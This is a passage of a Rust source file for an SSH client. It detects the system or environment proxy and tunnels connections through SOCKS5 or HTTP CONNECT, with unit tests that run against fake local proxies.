//! 系统代理检测与经代理的 TCP 拨号。
//!
//! 用途：部分服务器在海外，直连不稳定。Host 右键菜单的「使用系统代理连接」把
//! **本次**连接（终端、SFTP、端口转发隧道）改为经系统代理建立。该标记只存在于
//! 内存中的 [`SshConnectionConfig::use_system_proxy`]，不写回磁盘配置。
//!
//! 代理来源（按优先级）：
//! 1. 环境变量 `ALL_PROXY` / `HTTPS_PROXY` / `HTTP_PROXY`（跨平台，显式设置优先）；
//! 2. macOS 系统设置（`scutil --proxy`，即「系统设置 → 网络 → 代理」里启用的项）。
//!
//! 协议支持 SOCKS5 与 HTTP CONNECT，两者都只实现无认证形态：系统代理通常只监听
//! 回环、不要求认证；代理要求认证时会明确报错，而不是静默退回直连。

use std::collections::HashMap;

use anyhow::{anyhow, bail};
use tokio::io::{AsyncReadExt, AsyncWriteExt};
use tokio::net::TcpStream;

use crate::ssh::config::SshConnectionConfig;

/// 代理协议。
#[derive(Clone, Copy, Debug, PartialEq, Eq)]
pub enum ProxyKind {
    Socks5,
    HttpConnect,
}

/// 一个可用的系统代理。
#[derive(Clone, Debug, PartialEq, Eq)]
pub struct SystemProxy {
    pub kind: ProxyKind,
    pub host: String,
    pub port: u16,
    /// 不走代理的目标（系统设置的 `ExceptionsList`，或环境变量的 `NO_PROXY`）。
    ///
    /// 用户点「使用系统代理连接」时，期望的是「按系统代理的规则走」——而系统
    /// 代理本身就声明了哪些目标不该走它（内网段、`.local` 等）。忽略这份列表会
    /// 让内网主机被硬塞进代理，轻则绕远路，重则代理拒绝转回内网而连不上。
    pub exceptions: Vec<String>,
}

impl SystemProxy {
    /// 展示用形态（`socks5://127.0.0.1:7893`），用于日志与错误信息。
    pub fn display(&self) -> String {
        let scheme = match self.kind {
            ProxyKind::Socks5 => "socks5",
            ProxyKind::HttpConnect => "http",
        };
        format!("{scheme}://{}:{}", self.host, self.port)
    }

    /// 该目标是否在例外列表里（应当直连）。
    pub fn bypasses(&self, host: &str) -> bool {
        self.exceptions
            .iter()
            .any(|pattern| exception_matches(pattern, host))
    }

    /// 等价的 OpenSSH `ProxyCommand`：系统 ssh 路径（Touch ID / FIDO2 密钥）只能
    /// 用它表达代理——OpenSSH 不读系统代理设置。
    ///
    /// `%h` / `%p` 由 ssh 展开为目标主机与端口。`nc -X 5` = SOCKS5，
    /// `nc -X connect` = HTTP CONNECT。
    ///
    /// 例外判断不在这里：`NO_PROXY` 只有 curl/wget 那类工具认，OpenSSH 与 `nc`
    /// 都不读它，写进命令行只会假装生效。调用方应当先经 [`route`] 过滤目标，
    /// 命中例外的直接不给 `ProxyCommand`。
    ///
    /// 返回 `None` 表示代理地址无法安全地写进命令行：`ProxyCommand` 由 shell
    /// 解释，地址里出现 shell 元字符时不能拼进去（构造一个可能执行任意命令的
    /// 字符串比放弃代理危险得多）。代理地址通常来自本机系统设置或环境变量，
    /// 但仍按不可信输入处理。
    pub fn openssh_proxy_command(&self) -> Option<String> {
        if !is_shell_safe_host(&self.host) {
            log::warn!(
                "系统代理地址含 shell 元字符，无法写入 ProxyCommand: {}",
                self.host
            );
            return None;
        }
        // IPv6 字面量代理：macOS 的 `nc -x` 无法解析（实测 `[::1]:1080` 与
        // `::1:1080` 都报 getaddrinfo 失败）。生成一条必然失败的 ProxyCommand
        // 会把「代理用不了」伪装成「连接被拒」，不如直接放弃——russh 路径能
        // 正常走 IPv6 代理，两条传输的差异到此为止。
        if self.host.contains(':') {
            log::warn!(
                "系统代理是 IPv6 地址（{}），系统 ssh 的 nc 不支持，改为直连",
                self.host
            );
            return None;
        }
        let protocol = match self.kind {
            ProxyKind::Socks5 => "5",
            ProxyKind::HttpConnect => "connect",
        };
        Some(format!(
            "nc -X {protocol} -x {}:{} %h %p",
            self.host, self.port
        ))
    }
}

/// 代理地址是否可以安全地出现在 shell 命令行里。
///
/// 只允许主机名字符集（字母/数字/`.`/`-`/`_`）与 IPv6 的 `[`/`]`/`:`；
/// 其余（空格、`;`、`$`、反引号、`|`、`&`…）一律拒绝。IPv6 是否**可用**由
/// [`SystemProxy::openssh_proxy_command`] 另行判定——这里只回答「拼进 shell
/// 会不会变成命令注入」。
fn is_shell_safe_host(host: &str) -> bool {
    !host.is_empty()
        && host
            .chars()
            .all(|c| c.is_ascii_alphanumeric() || matches!(c, '.' | '-' | '_' | ':' | '[' | ']'))
}

/// 检测系统代理。未启用或不可解析时返回 `None`。
///
/// 同步实现（macOS 分支会拉起一次 `scutil`，实测 20~120ms）：调用方一次连接只调
/// 一次，不在渲染路径上；结果按 [`DETECT_CACHE_TTL`] 短缓存，同一批连接（终端 +
/// SFTP + 隧道）共享一次探测。
pub fn detect() -> Option<SystemProxy> {
    if let Some(proxy) = proxy_from_env() {
        return Some(proxy);
    }
    #[cfg(target_os = "macos")]
    {
        if let Some(proxy) = cached_system_settings_proxy() {
            return Some(proxy);
        }
    }
    None
}

/// 系统代理探测结果的缓存时长。
///
/// 存在的意义是省掉同一批连接里的重复 `scutil` 子进程（进程启动是这里唯一的
/// 开销）。取秒级：用户在「系统设置」里刚改完代理再回来重连，能立刻生效。
#[cfg(target_os = "macos")]
const DETECT_CACHE_TTL: std::time::Duration = std::time::Duration::from_secs(2);

/// 系统设置探测结果的缓存：(探测时刻, 结果)。
#[cfg(target_os = "macos")]
type DetectCache = parking_lot::Mutex<Option<(std::time::Instant, Option<SystemProxy>)>>;

#[cfg(target_os = "macos")]
fn cached_system_settings_proxy() -> Option<SystemProxy> {
    static CACHE: std::sync::OnceLock<DetectCache> = std::sync::OnceLock::new();
    let cache = CACHE.get_or_init(|| parking_lot::Mutex::new(None));

    let mut guard = cache.lock();
    if let Some((at, proxy)) = guard.as_ref()
        && at.elapsed() < DETECT_CACHE_TTL
    {
        return proxy.clone();
    }
    let proxy = proxy_from_system_settings();
    *guard = Some((std::time::Instant::now(), proxy.clone()));
    proxy
}

/// 本次连接的代理路由决策。
///
/// 把「该直连」与「选了代理但没有代理可用」分开：前者是正常结果（本机地址、
/// 命中例外、根本没选代理），后者必须报错——静默直连会让「连不上」的原因
/// 无从判断。
#[derive(Clone, Debug, PartialEq, Eq)]
pub enum ProxyRoute {
    /// 直连。
    Direct,
    /// 经该代理。
    Via(SystemProxy),
    /// 用户选了代理，但本机检测不到任何可用代理。
    Unavailable,
}

/// 决策：本次连接走直连还是走代理。
///
/// 系统 ssh 路径与 russh 路径共用它，保证两条传输对「这个目标走不走代理」
/// 的结论一致。
pub fn route(config: &SshConnectionConfig) -> ProxyRoute {
    // 先看开关再看检测：`detect()` 会扫环境变量，macOS 上还会拉起一次
    // `scutil` 子进程（PTY 路径调用本函数时正处在 GPUI 的 UI 线程上）。
    // 没选代理的普通直连不该为此付任何代价。
    if !config.use_system_proxy {
        return ProxyRoute::Direct;
    }
    route_with(config, detect())
}

/// [`route`] 的纯函数形态：把「检测到的代理」作为入参。
///
/// 决策本身（选没选代理、是不是本机地址、命不命中例外）不读进程环境变量，
/// 因此不依赖运行环境。
fn route_with(config: &SshConnectionConfig, detected: Option<SystemProxy>) -> ProxyRoute {
    if !config.use_system_proxy {
        return ProxyRoute::Direct;
    }
    if bypasses_proxy(&config.host) {
        log::info!("系统代理：{} 是本机地址，直连", config.host);
        return ProxyRoute::Direct;
    }
    let Some(proxy) = detected else {
        return ProxyRoute::Unavailable;
    };
    if proxy.bypasses(&config.host) {
        log::info!(
            "系统代理：{} 命中代理例外列表（{:?}），直连",
            config.host,
            proxy.exceptions
        );
        return ProxyRoute::Direct;
    }
    ProxyRoute::Via(proxy)
}

/// 该平台能否为**系统 ssh** 表达代理。
///
/// 需要支持 `-X` 的 netcat（SOCKS5 / HTTP CONNECT）：macOS 自带的
/// `/usr/bin/nc` 有；Linux 的 GNU netcat 与 BSD netcat 都没有，且不保证预装。
/// 在不支持的平台上生成 `ProxyCommand` 只会把「代理不可用」伪装成「连接被拒」，
/// 因此那里如实说明并直连。
pub const OPENSSH_PROXY_SUPPORTED: bool = cfg!(target_os = "macos");

/// 本次连接是否需要、且能够经系统代理建立。
///
/// - `Ok(None)`：直连（未选择代理，或目标是代理的例外）；
/// - `Ok(Some(stream))`：已完成代理握手、可直接交给 SSH 的 TCP 流；
/// - `Err(_)`：选择了代理但无法经代理连接（未检测到代理、代理不可达、代理拒绝）。
///
/// 失败一律返回错误而不是退回直连：用户点的是「使用系统代理连接」，静默直连会
/// 让「连不上」的原因无从判断。
pub async fn dial(config: &SshConnectionConfig) -> anyhow::Result<Option<TcpStream>> {
    match route(config) {
        ProxyRoute::Direct => Ok(None),
        ProxyRoute::Unavailable => Err(anyhow!(
            "未检测到系统代理：请在「系统设置 → 网络 → 代理」中启用 SOCKS 或 HTTPS 代理，或设置 ALL_PROXY 环境变量"
        )),
        ProxyRoute::Via(proxy) => {
            let stream = connect_via(&proxy, &config.host, config.port).await?;
            log::info!(
                "SSH: 经系统代理 {} 连接 {}:{}",
                proxy.display(),
                config.host,
                config.port
            );
            Ok(Some(stream))
        }
    }
}

/// 经 `proxy` 连到 `host:port`，返回已完成代理握手的流。
pub async fn connect_via(proxy: &SystemProxy, host: &str, port: u16) -> anyhow::Result<TcpStream> {
    let stream = TcpStream::connect((proxy.host.as_str(), proxy.port))
        .await
        .map_err(|err| anyhow!("连接系统代理 {} 失败: {}", proxy.display(), err))?;
    match proxy.kind {
        ProxyKind::Socks5 => socks5_connect(stream, host, port).await,
        ProxyKind::HttpConnect => http_connect(stream, host, port).await,
    }
}

/// 本机地址不走代理：代理端常拒绝转回本机，系统代理的例外列表默认也含回环。
/// 只处理无歧义的回环与 `.local`，CIDR 形式的例外不做猜测。
fn bypasses_proxy(host: &str) -> bool {
    host.eq_ignore_ascii_case("localhost")
        || host == "::1"
        || host.starts_with("127.")
        || host.to_ascii_lowercase().ends_with(".local")
}

/// 例外条目是否覆盖 `host`。
///
/// 支持两种形态（与 `NO_PROXY` 的常见写法一致）：
/// - `*`：全部直连；
/// - 域名后缀（`example.com` 匹配 `a.example.com`）或精确主机名。
///
/// CIDR（`10.0.0.0/8`）**有意不匹配**：按前缀猜网段会把「10.0.0.0/8 里的某台
/// 主机」误判成「字符串以 10. 开头」，而 `10.1.2.3` 与 `10.0.0.0/8` 的关系
/// 需要真正的位运算。宁可让它走代理（用户可显式改设置），也不要猜错。
fn exception_matches(pattern: &str, host: &str) -> bool {
    let pattern = pattern.trim().trim_start_matches("*.");
    if pattern.is_empty() {
        return false;
    }
    if pattern == "*" {
        return true;
    }
    if pattern.contains('/') {
        return false;
    }
    let host = host.trim_end_matches('.');
    if host.eq_ignore_ascii_case(pattern) {
        return true;
    }
    // 后缀匹配必须落在 `.` 边界上（`notexample.com` 不命中 `example.com`）。
    //
    // **不得用字节下标切片**：主机名是任意用户输入（中文主机名很常见），
    // `host[host.len() - pattern.len()..]` 会切进多字节字符内部而 panic
    // （char boundary）。改成「按 `.` 逐段剥前缀、逐段比较」——每段都由
    // `split_once('.')` 切出，天然落在字符边界上，且能匹配任意长度的模式。
    let mut rest = host;
    while let Some((_, tail)) = rest.split_once('.') {
        if tail.eq_ignore_ascii_case(pattern) {
            return true;
        }
        rest = tail;
    }
    false
}

// ─── 代理来源 ────────────────────────────────────────────────────────

fn proxy_from_env() -> Option<SystemProxy> {
    // 顺序即优先级：ALL_PROXY 表达「所有协议都走它」，比按协议分的更明确。
    const KEYS: &[&str] = &[
        "ALL_PROXY",
        "all_proxy",
        "HTTPS_PROXY",
        "https_proxy",
        "HTTP_PROXY",
        "http_proxy",
    ];
    let exceptions = no_proxy_from_env();
    for key in KEYS {
        let Ok(raw) = std::env::var(key) else {
            continue;
        };
        let raw = raw.trim();
        if raw.is_empty() {
            continue;
        }
        if raw.contains('@') {
            log::warn!("忽略 {key}：代理含认证信息，当前不支持带认证的代理");
            continue;
        }
        match parse_proxy_url(raw) {
            Some(mut proxy) => {
                proxy.exceptions = exceptions.clone();
                return Some(proxy);
            }
            None => log::warn!("忽略 {key}={raw}：无法解析为代理地址"),
        }
    }
    None
}

/// `NO_PROXY` / `no_proxy`：逗号分隔的例外列表。
fn no_proxy_from_env() -> Vec<String> {
    for key in ["NO_PROXY", "no_proxy"] {
        let Ok(raw) = std::env::var(key) else {
            continue;
        };
        let list = parse_exception_list(&raw);
        if !list.is_empty() {
            return list;
        }
    }
    Vec::new()
}

/// 逗号分隔的例外列表（`NO_PROXY` 的语法）。
fn parse_exception_list(raw: &str) -> Vec<String> {
    raw.split(',')
        .map(|entry| entry.trim().to_string())
        .filter(|entry| !entry.is_empty())
        .collect()
}

/// 解析代理地址：`scheme://host:port`，无 scheme 时按 HTTP CONNECT 处理
/// （与 curl `-x` 的默认语义一致）。
fn parse_proxy_url(raw: &str) -> Option<SystemProxy> {
    let (kind, rest) = match raw.split_once("://") {
        Some(("socks5" | "socks5h" | "socks", rest)) => (ProxyKind::Socks5, rest),
        Some(("http" | "https", rest)) => (ProxyKind::HttpConnect, rest),
        // 未知 scheme 不猜：宁可当作未配置，也不要连到一个语义不明的地址
        Some(_) => return None,
        None => (ProxyKind::HttpConnect, raw),
    };
    // 容忍结尾的路径（`host:port/`）
    let rest = rest.split('/').next().unwrap_or(rest);
    let default_port = match kind {
        ProxyKind::Socks5 => 1080,
        ProxyKind::HttpConnect => 3128,
    };
    let (host, port) = split_host_port(rest, default_port)?;
    Some(SystemProxy {
        kind,
        host,
        port,
        exceptions: Vec::new(),
    })
}

/// 拆分 `host:port`；IPv6 用方括号形态 `[::1]:1080`。无端口时用 `default_port`。
fn split_host_port(raw: &str, default_port: u16) -> Option<(String, u16)> {
    if raw.is_empty() {
        return None;
    }
    if let Some(rest) = raw.strip_prefix('[') {
        let (host, tail) = rest.split_once(']')?;
        if host.is_empty() {
            return None;
        }
        let port = match tail.strip_prefix(':') {
            Some(port) => port.parse().ok()?,
            None if tail.is_empty() => default_port,
            None => return None,
        };
        return Some((host.to_string(), port));
    }
    match raw.rsplit_once(':') {
        Some((host, port)) => {
            if host.is_empty() {
                return None;
            }
            Some((host.to_string(), port.parse().ok()?))
        }
        None => Some((raw.to_string(), default_port)),
    }
}

#[cfg(target_os = "macos")]
fn proxy_from_system_settings() -> Option<SystemProxy> {
    let output = std::process::Command::new("/usr/sbin/scutil")
        .arg("--proxy")
        .output()
        .ok()?;
    if !output.status.success() {
        log::warn!("scutil --proxy 退出码异常: {}", output.status);
        return None;
    }
    parse_scutil_proxy(&String::from_utf8_lossy(&output.stdout))
}

/// 解析 `scutil --proxy` 的输出（纯函数，便于单测）。
///
/// SOCKS 优先：它承载任意 TCP，不要求代理端实现 CONNECT 语义。
fn parse_scutil_proxy(output: &str) -> Option<SystemProxy> {
    let mut values: HashMap<&str, &str> = HashMap::new();
    let mut exceptions: Vec<String> = Vec::new();
    // `ExceptionsList` 是数组，元素形如 `    0 : localhost`。
    let mut in_exceptions = false;
    for line in output.lines() {
        let trimmed = line.trim();
        if let Some(rest) = trimmed.strip_prefix("ExceptionsList") {
            in_exceptions = true;
            // 空数组写成 `ExceptionsList : <array> {}` 一行
            if !rest.contains('{') || rest.contains('}') {
                in_exceptions = false;
            }
            continue;
        }
        if in_exceptions {
            if trimmed.starts_with('}') {
                in_exceptions = false;
                continue;
            }
            if let Some((_, value)) = trimmed.split_once(':') {
                let value = value.trim();
                if !value.is_empty() {
                    exceptions.push(value.to_string());
                }
            }
            continue;
        }
        // 形如 `  SOCKSProxy : 127.0.0.1`；键不含冒号，取第一个冒号即分隔符。
        let Some((key, value)) = line.split_once(':') else {
            continue;
        };
        values.insert(key.trim(), value.trim());
    }
    let enabled = |key: &str| values.get(key).is_some_and(|value| *value == "1");
    let field = |key: &str| values.get(key).copied().filter(|value| !value.is_empty());

    let candidates = [
        ("SOCKSEnable", ProxyKind::Socks5, "SOCKSProxy", "SOCKSPort"),
        (
            "HTTPSEnable",
            ProxyKind::HttpConnect,
            "HTTPSProxy",
            "HTTPSPort",
        ),
        (
            "HTTPEnable",
            ProxyKind::HttpConnect,
            "HTTPProxy",
            "HTTPPort",
        ),
    ];
    for (enable_key, kind, host_key, port_key) in candidates {
        if !enabled(enable_key) {
            continue;
        }
        let (Some(host), Some(port)) = (field(host_key), field(port_key)) else {
            continue;
        };
        let Ok(port) = port.parse::<u16>() else {
            log::warn!("系统代理 {port_key}={port} 不是合法端口，已忽略");
            continue;
        };
        return Some(SystemProxy {
            kind,
            host: host.to_string(),
            port,
            exceptions,
        });
    }
    None
}

// ─── SOCKS5 ──────────────────────────────────────────────────────────

/// SOCKS5 握手（RFC 1928）：方法协商 → CONNECT 请求 → 应答。
///
/// 应答里的绑定地址必须**完整读掉**：残留字节会被 SSH 当成服务端标识串，
/// 表现为「握手失败」而非代理错误。
async fn socks5_connect(mut stream: TcpStream, host: &str, port: u16) -> anyhow::Result<TcpStream> {
    stream
        .write_all(&[0x05, 0x01, 0x00])
        .await
        .map_err(|err| anyhow!("SOCKS5 方法协商写入失败: {err}"))?;
    let mut method = [0u8; 2];
    stream
        .read_exact(&mut method)
        .await
        .map_err(|err| anyhow!("SOCKS5 方法协商读取失败: {err}"))?;
    if method[0] != 0x05 {
        bail!("SOCKS5 代理应答版本异常: {:#04x}", method[0]);
    }
    if method[1] != 0x00 {
        bail!(
            "SOCKS5 代理要求认证（方法 {:#04x}），当前不支持带认证的代理",
            method[1]
        );
    }

    let mut request = vec![0x05, 0x01, 0x00];
    append_socks5_address(&mut request, host)?;
    request.extend_from_slice(&port.to_be_bytes());
    stream
        .write_all(&request)
        .await
        .map_err(|err| anyhow!("SOCKS5 连接请求写入失败: {err}"))?;

    let mut head = [0u8; 4];
    stream
        .read_exact(&mut head)
        .await
        .map_err(|err| anyhow!("SOCKS5 连接应答读取失败: {err}"))?;
    if head[1] != 0x00 {
        bail!(
            "SOCKS5 代理拒绝连接 {host}:{port}（{}）",
            socks5_reply_message(head[1])
        );
    }
    let skip = match head[3] {
        0x01 => 4 + 2,
        0x04 => 16 + 2,
        0x03 => {
            let mut len = [0u8; 1];
            stream
                .read_exact(&mut len)
                .await
                .map_err(|err| anyhow!("SOCKS5 应答域名长度读取失败: {err}"))?;
            len[0] as usize + 2
        }
        other => bail!("SOCKS5 代理应答地址类型异常: {other:#04x}"),
    };
    let mut rest = vec![0u8; skip];
    stream
        .read_exact(&mut rest)
        .await
        .map_err(|err| anyhow!("SOCKS5 应答绑定地址读取失败: {err}"))?;
    Ok(stream)
}

/// 按 SOCKS5 地址格式追加目标：IPv4/IPv6 用二进制，域名用「长度 + 字节」。
fn append_socks5_address(buf: &mut Vec<u8>, host: &str) -> anyhow::Result<()> {
    match host.parse::<std::net::IpAddr>() {
        Ok(std::net::IpAddr::V4(ip)) => {
            buf.push(0x01);
            buf.extend_from_slice(&ip.octets());
        }
        Ok(std::net::IpAddr::V6(ip)) => {
            buf.push(0x04);
            buf.extend_from_slice(&ip.octets());
        }
        Err(_) => {
            let bytes = host.as_bytes();
            if bytes.len() > 255 {
                bail!("主机名过长，无法经 SOCKS5 代理: {host}");
            }
            buf.push(0x03);
            buf.push(bytes.len() as u8);
            buf.extend_from_slice(bytes);
        }
    }
    Ok(())
}

fn socks5_reply_message(reply: u8) -> &'static str {
    match reply {
        0x01 => "代理内部错误",
        0x02 => "代理规则不允许该连接",
        0x03 => "网络不可达",
        0x04 => "主机不可达",
        0x05 => "目标拒绝连接",
        0x06 => "TTL 超时",
        0x07 => "命令不支持",
        0x08 => "地址类型不支持",
        _ => "未知错误",
    }
}

// ─── HTTP CONNECT ────────────────────────────────────────────────────

/// 代理应答头长度上限（超限即视为协议异常，避免被一个不回空行的代理吊死）。
const MAX_CONNECT_RESPONSE_BYTES: usize = 8 * 1024;

/// HTTP CONNECT 握手：`CONNECT host:port HTTP/1.1` → `200`。
///
/// 逐字节读到空行为止：多读一个字节都会吃掉紧随其后的 SSH 标识串。
async fn http_connect(mut stream: TcpStream, host: &str, port: u16) -> anyhow::Result<TcpStream> {
    let authority = authority(host, port);
    let request = format!(
        "CONNECT {authority} HTTP/1.1\r\nHost: {authority}\r\nProxy-Connection: keep-alive\r\n\r\n"
    );
    stream
        .write_all(request.as_bytes())
        .await
        .map_err(|err| anyhow!("HTTP 代理请求写入失败: {err}"))?;

    let mut head = Vec::with_capacity(256);
    let mut byte = [0u8; 1];
    while !head.ends_with(b"\r\n\r\n") {
        if head.len() >= MAX_CONNECT_RESPONSE_BYTES {
            bail!("HTTP 代理应答异常：{MAX_CONNECT_RESPONSE_BYTES} 字节内未见空行");
        }
        stream
            .read_exact(&mut byte)
            .await
            .map_err(|err| anyhow!("HTTP 代理应答读取失败: {err}"))?;
        head.push(byte[0]);
    }

    let text = String::from_utf8_lossy(&head);
    let status = text.lines().next().unwrap_or_default().trim();
    if !status.starts_with("HTTP/") {
        bail!("HTTP 代理应答格式异常: {status}");
    }
    if status.split_whitespace().nth(1) != Some("200") {
        bail!("HTTP 代理拒绝 CONNECT {authority}: {status}");
    }
    Ok(stream)
}

/// CONNECT 的目标 authority：IPv6 字面量要带方括号。
fn authority(host: &str, port: u16) -> String {
    if host.contains(':') && !host.starts_with('[') {
        format!("[{host}]:{port}")
    } else {
        format!("{host}:{port}")
    }
}

#[cfg(test)]
mod tests {
    use super::*;
    use std::net::Ipv4Addr;
    use std::time::Duration;
    use tokio::net::TcpListener;

    /// 测试用的异步执行器：**不复用**进程共享的 SSH runtime。
    ///
    /// 共享 runtime 一旦创建就常驻（4 个 worker 线程），而
    /// `terminal_memory_tests` 里的 footprint 用例是进程级测量、对并发分配敏感
    /// （见该文件的说明）。测试用短生命周期的单线程 runtime，跑完即释放。
    fn block_on<F: std::future::Future>(future: F) -> F::Output {
        tokio::runtime::Builder::new_current_thread()
            .enable_all()
            .build()
            .expect("测试 runtime 应可创建")
            .block_on(async {
                tokio::time::timeout(Duration::from_secs(10), future)
                    .await
                    .expect("测试超时（10 秒）")
            })
    }

    /// 假「SSH 服务器」：收到一行后原样回显，用于证明代理把字节透传到了目标。
    async fn fake_echo_server() -> (String, u16) {
        let listener = TcpListener::bind("127.0.0.1:0").await.unwrap();
        let addr = listener.local_addr().unwrap();
        tokio::spawn(async move {
            let (mut socket, _) = listener.accept().await.unwrap();
            let mut buf = vec![0u8; 64];
            let read = socket.read(&mut buf).await.unwrap();
            socket.write_all(&buf[..read]).await.unwrap();
        });
        (addr.ip().to_string(), addr.port())
    }

    /// 假 SOCKS5 代理：完整走一遍方法协商 + CONNECT，再桥接到目标。
    async fn fake_socks5_proxy(require_auth: bool) -> (String, u16) {
        let listener = TcpListener::bind("127.0.0.1:0").await.unwrap();
        let addr = listener.local_addr().unwrap();
        tokio::spawn(async move {
            let (mut client, _) = listener.accept().await.unwrap();
            let mut greeting = [0u8; 3];
            client.read_exact(&mut greeting).await.unwrap();
            assert_eq!(greeting[0], 0x05, "客户端必须发 SOCKS5 版本号");
            assert_eq!(greeting[2], 0x00, "客户端必须只提供无认证方法");
            let method = if require_auth { 0x02 } else { 0x00 };
            client.write_all(&[0x05, method]).await.unwrap();
            if require_auth {
                return;
            }

            let mut head = [0u8; 4];
            client.read_exact(&mut head).await.unwrap();
            assert_eq!(head[1], 0x01, "必须是 CONNECT 命令");
            let host = match head[3] {
                0x01 => {
                    let mut octets = [0u8; 4];
                    client.read_exact(&mut octets).await.unwrap();
                    Ipv4Addr::from(octets).to_string()
                }
                0x03 => {
                    let mut len = [0u8; 1];
                    client.read_exact(&mut len).await.unwrap();
                    let mut name = vec![0u8; len[0] as usize];
                    client.read_exact(&mut name).await.unwrap();
                    String::from_utf8(name).unwrap()
                }
                other => panic!("意外的地址类型 {other:#04x}"),
            };
            let mut port = [0u8; 2];
            client.read_exact(&mut port).await.unwrap();
            let target = TcpStream::connect((host.as_str(), u16::from_be_bytes(port)))
                .await
                .unwrap();
            // 成功应答：绑定地址 0.0.0.0:0（客户端必须把它读掉）
            client
                .write_all(&[0x05, 0x00, 0x00, 0x01, 0, 0, 0, 0, 0, 0])
                .await
                .unwrap();
            bridge(client, target).await;
        });
        (addr.ip().to_string(), addr.port())
    }

    /// 假 HTTP 代理：读到空行后回 `200`，再桥接到目标。
    async fn fake_http_proxy(status: &'static str) -> (String, u16) {
        let listener = TcpListener::bind("127.0.0.1:0").await.unwrap();
        let addr = listener.local_addr().unwrap();
        tokio::spawn(async move {
            let (mut client, _) = listener.accept().await.unwrap();
            let mut head = Vec::new();
            let mut byte = [0u8; 1];
            while !head.ends_with(b"\r\n\r\n") {
                client.read_exact(&mut byte).await.unwrap();
                head.push(byte[0]);
            }
            let text = String::from_utf8_lossy(&head).to_string();
            assert!(text.starts_with("CONNECT "), "首行必须是 CONNECT：{text}");
            let reply = format!("HTTP/1.1 {status}\r\n\r\n");
            client.write_all(reply.as_bytes()).await.unwrap();
            if !status.starts_with("200") {
                return;
            }
            let authority = text
                .split_whitespace()
                .nth(1)
                .expect("CONNECT 必须带目标")
                .to_string();
            let (host, port) = authority.rsplit_once(':').unwrap();
            let target = TcpStream::connect((host, port.parse::<u16>().unwrap()))
                .await
                .unwrap();
            bridge(client, target).await;
        });
        (addr.ip().to_string(), addr.port())
    }

    async fn bridge(client: TcpStream, target: TcpStream) {
        let (mut client_read, mut client_write) = client.into_split();
        let (mut target_read, mut target_write) = target.into_split();
        tokio::spawn(async move {
            let _ = tokio::io::copy(&mut client_read, &mut target_write).await;
        });
        tokio::spawn(async move {
            let _ = tokio::io::copy(&mut target_read, &mut client_write).await;
        });
    }

    /// 经代理拨号后，字节必须真的到达目标并被回显。
    async fn assert_round_trip(proxy: &SystemProxy, target: (String, u16)) {
        let mut stream = connect_via(proxy, &target.0, target.1)
            .await
            .expect("经代理连接应当成功");
        stream.write_all(b"SSH-2.0-deepterm\r\n").await.unwrap();
        let mut echo = vec![0u8; 18];
        stream.read_exact(&mut echo).await.unwrap();
        assert_eq!(&echo, b"SSH-2.0-deepterm\r\n");
    }

    #[test]
    fn socks5_dial_round_trips_through_the_proxy() {
        block_on(async {
            let target = fake_echo_server().await;
            let (host, port) = fake_socks5_proxy(false).await;
            let proxy = SystemProxy {
                kind: ProxyKind::Socks5,
                host,
                port,
                exceptions: Vec::new(),
            };
            assert_round_trip(&proxy, target).await;
        });
    }

    #[test]
    fn http_connect_dial_round_trips_through_the_proxy() {
        block_on(async {
            let target = fake_echo_server().await;
            let (host, port) = fake_http_proxy("200 Connection established").await;
            let proxy = SystemProxy {
                kind: ProxyKind::HttpConnect,
                host,
                port,
                exceptions: Vec::new(),
            };
            assert_round_trip(&proxy, target).await;
        });
    }

    #[test]
    fn socks5_auth_requirement_is_reported_not_ignored() {
        block_on(async {
            let target = fake_echo_server().await;
            let (host, port) = fake_socks5_proxy(true).await;
            let proxy = SystemProxy {
                kind: ProxyKind::Socks5,
                host,
                port,
                exceptions: Vec::new(),
            };
            let err = connect_via(&proxy, &target.0, target.1)
                .await
                .expect_err("要求认证的代理必须报错");
            assert!(
                err.to_string().contains("认证"),
                "错误信息应说明代理要求认证: {err}"
            );
        });
    }

    #[test]
    fn http_proxy_rejection_is_reported_with_the_status_line() {
        block_on(async {
            let target = fake_echo_server().await;
            let (host, port) = fake_http_proxy("407 Proxy Authentication Required").await;
            let proxy = SystemProxy {
                kind: ProxyKind::HttpConnect,
                host,
                port,
                exceptions: Vec::new(),
            };
            let err = connect_via(&proxy, &target.0, target.1)
                .await
                .expect_err("代理拒绝时必须报错");
            assert!(
                err.to_string().contains("407"),
                "错误信息应带上代理的状态行: {err}"
            );
        });
    }

    #[test]
    fn proxy_flag_off_means_direct() {
        // 未选择代理：不探测、不拨号，直接交给调用方走原来的直连路径。
        let mut config = SshConnectionConfig::local();
        config.host = "example.com".to_string();
        block_on(async {
            assert!(dial(&config).await.unwrap().is_none());
        });
    }

    #[test]
    fn parse_scutil_prefers_socks_then_https_then_http() {
        let all = r#"<dictionary> {
  HTTPEnable : 1
  HTTPPort : 7893
  HTTPProxy : 127.0.0.1
  HTTPSEnable : 1
  HTTPSPort : 7893
  HTTPSProxy : 127.0.0.1
  SOCKSEnable : 1
  SOCKSPort : 7893
  SOCKSProxy : 127.0.0.1
}"#;
        assert_eq!(
            parse_scutil_proxy(all),
            Some(SystemProxy {
                kind: ProxyKind::Socks5,
                host: "127.0.0.1".into(),
                port: 7893,
                exceptions: Vec::new()
            }),
            "SOCKS 可用时优先 SOCKS5（不依赖代理端实现 CONNECT）"
        );

        let https_only = r#"<dictionary> {
  HTTPEnable : 0
  HTTPSEnable : 1
  HTTPSPort : 8888
  HTTPSProxy : 10.0.0.9
}"#;
        assert_eq!(
            parse_scutil_proxy(https_only),
            Some(SystemProxy {
                kind: ProxyKind::HttpConnect,
                host: "10.0.0.9".into(),
                port: 8888,
                exceptions: Vec::new()
            })
        );

        let http_only =
            "<dictionary> {\n  HTTPEnable : 1\n  HTTPPort : 3128\n  HTTPProxy : proxy.lan\n}";
        assert_eq!(
            parse_scutil_proxy(http_only),
            Some(SystemProxy {
                kind: ProxyKind::HttpConnect,
                host: "proxy.lan".into(),
                port: 3128,
                exceptions: Vec::new()
            })
        );

        // 全未启用 / 端口非法：视为没有系统代理
        let disabled =
            "<dictionary> {\n  SOCKSEnable : 0\n  SOCKSProxy : 127.0.0.1\n  SOCKSPort : 1080\n}";
        assert_eq!(parse_scutil_proxy(disabled), None);
        let bad_port =
            "<dictionary> {\n  SOCKSEnable : 1\n  SOCKSProxy : 127.0.0.1\n  SOCKSPort : abc\n}";
        assert_eq!(parse_scutil_proxy(bad_port), None);
        // 启用但缺地址：跳过该项，不构造半截代理
        let missing_host = "<dictionary> {\n  SOCKSEnable : 1\n  SOCKSPort : 1080\n}";
        assert_eq!(parse_scutil_proxy(missing_host), None);
    }

    /// 系统代理自带的例外列表必须被读出来：用户点「使用系统代理连接」时期望的
